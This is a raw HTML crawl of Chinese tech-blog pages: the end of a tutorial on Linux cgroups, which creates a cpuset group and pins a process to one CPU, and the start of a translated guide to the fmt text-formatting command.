data-line=\"crayon-5a6359ca744f5414124892-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f5414124892-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-1\"><span class=\"crayon-p\"># mkdir cgroups</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-2\"><span class=\"crayon-p\"># mount -t cgroup -o cpuset cgroups ./cgroups/</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-3\"><span class=\"crayon-p\"># ls cgroups/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-4\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clone_children   </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_pressure_enabled</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-5\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">procs            </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_spread_page</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-6\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sane_behavior    </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_spread_slab</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-7\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpu_exclusive    </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mems</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-8\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpus             </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_load_balance</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-9\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_cpus   </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_relax_domain_level</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-10\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_mems   </span><span class=\"crayon-e\">docker</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-11\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_exclusive    </span><span class=\"crayon-e\">tasks</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-12\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_hardwall     </span><span class=\"crayon-e\">notify_on_release</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f5414124892-13\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_migrate   </span><span class=\"crayon-e\">release_agent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f5414124892-14\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">memory_pressure</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>5. 创建一个新的组group0</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744f9789215694\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mkdir group0\r\n# ls group0/\r\ncgroup.clone_children  cpuset.mem_exclusive       cpuset.mems\r\ncgroup.procs           cpuset.mem_hardwall        cpuset.sched_load_balance\r\ncpuset.cpu_exclusive   cpuset.memory_migrate      cpuset.sched_relax_domain_level\r\ncpuset.cpus            cpuset.memory_pressure     notify_on_release\r\ncpuset.effective_cpus  cpuset.memory_spread_page  tasks\r\ncpuset.effective_mems  cpuset.memory_spread_slab</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f9789215694-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f9789215694-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f9789215694-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f9789215694-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f9789215694-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f9789215694-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f9789215694-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f9789215694-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744f9789215694-1\"><span class=\"crayon-p\"># mkdir group0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f9789215694-2\"><span class=\"crayon-p\"># ls group0/</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f9789215694-3\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clone_children  </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_exclusive       </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mems</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f9789215694-4\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">procs           </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_hardwall        </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_load_balance</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f9789215694-5\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpu_exclusive   </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_migrate      </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_relax_domain_level</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f9789215694-6\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpus            </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_pressure     </span><span class=\"crayon-e\">notify_on_release</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744f9789215694-7\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_cpus  </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_spread_page  </span><span class=\"crayon-e\">tasks</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f9789215694-8\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_mems  </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">memory_spread_slab</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>6. 将上面的进程20553加入到新建的控制组中：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744fc157098763\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# echo 20553 &gt;&gt; group0/tasks \r\n# cat group0/tasks \r\n20553</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744fc157098763-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744fc157098763-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744fc157098763-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744fc157098763-1\"><span class=\"crayon-p\"># echo 20553 &gt;&gt; group0/tasks </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744fc157098763-2\"><span class=\"crayon-p\"># cat group0/tasks </span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744fc157098763-3\"><span class=\"crayon-cn\">20553</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>7. 限制该组的进程只能运行在编号为2的CPU上</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744ff377731833\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# echo 2 &gt; group0/cpuset.cpus\r\n# cat group0/cpuset.cpus\r\n2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744ff377731833-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744ff377731833-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744ff377731833-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744ff377731833-1\"><span class=\"crayon-p\"># echo 2 &gt; group0/cpuset.cpus</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744ff377731833-2\"><span class=\"crayon-p\"># cat group0/cpuset.cpus</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744ff377731833-3\"><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>8. 查看PID为20553的进程所运行的CPU编号</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca74502805308294\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep\r\nroot     20553   2 bash run.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca74502805308294-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca74502805308294-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca74502805308294-1\"><span class=\"crayon-p\"># ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca74502805308294-2\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">20553</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bash </span><span class=\"crayon-v\">run</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>上面的例子简单的展示了如何使用控制组。控制组通过文件和目录来操作，文件系统又是树形结构，因此如果不对cgroups的使用做一些限制的话，配置会变得异常复杂和混乱。因此，在新版的cgroups中做了一些限制。</p>\n<h1>小结</h1>\n<p>本文简要介绍了操作系统虚拟化的概念，以及实现操作系统虚拟化的技术——命名空间及控制组。并通过两个简单的例子演示了命名空间及控制组的使用方法。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113459\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113459votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113459\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"url_object_id": "4f058a89ae4912bf130d1b37274a904d", "title": "Linux 的 fmt 命令用法与案例", "url": "http://blog.jobbole.com/113479/", "create_date": "2018/01/15", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,fmt,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.howtoforge.com/linux-fmt-command/%20\">Himanshu Arora </a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9240-1.html\">lujun9972</a>   </div><div id=\"article_content\">\n<div>有时你会发现需要格式化某个文本文件中的内容。比如，该文本文件每行一个单词，而任务是把所有的单词都放在同一行。当然，你可以手工来做，但没人喜欢手工做这么耗时的工作。而且，这只是一个例子 – 事实上的任务可能千奇百怪。</div>\n<p>好在，有一个命令可以满足至少一部分的文本格式化的需求。这个工具就是 <code>fmt</code>。本教程将会讨论 <code>fmt</code> 的基本用法以及它提供的一些主要功能。文中所有的命令和指令都在 Ubuntu 16.04LTS 下经过了测试。</p>\n<h3 id=\"toc_1\">Linux fmt 命令</h3>\n<p><code>fmt</code> 命令是一个简单的文本格式化工具，任何人都能在命令行下运行它。它的基本语法为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6361c75595a632291933\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt [-WIDTH] [OPTION]... [FILE]...\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6361c75595a632291933-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6361c75595a632291933-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6361c75595a632291933-1\"><span class=\"crayon-i\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">WIDTH</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">OPTION</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">FILE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6361c75595a632291933-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>它的 man 页是这么说的：</p>\n<blockquote><p>重新格式化文件中的每一个段落，将结果写到标准输出。选项 <code>-WIDTH</code> 是 <code>--width=DIGITS</code> 形式的缩写。</p></blockquote>\n<p>下面这些问答方式的例子应该能让你对 <code>fmt</code> 的用法有很好的了解。</p>\n<h3 id=\"toc_2\">Q1、如何使用 fmt 来将文本内容格式成同一行？</h3>\n<p>使用 <code>fmt</code> 命令的基本形式（省略任何选项）就能做到这一点。你只需要将文件名作为参数传递给它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6361c755965924319186\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" 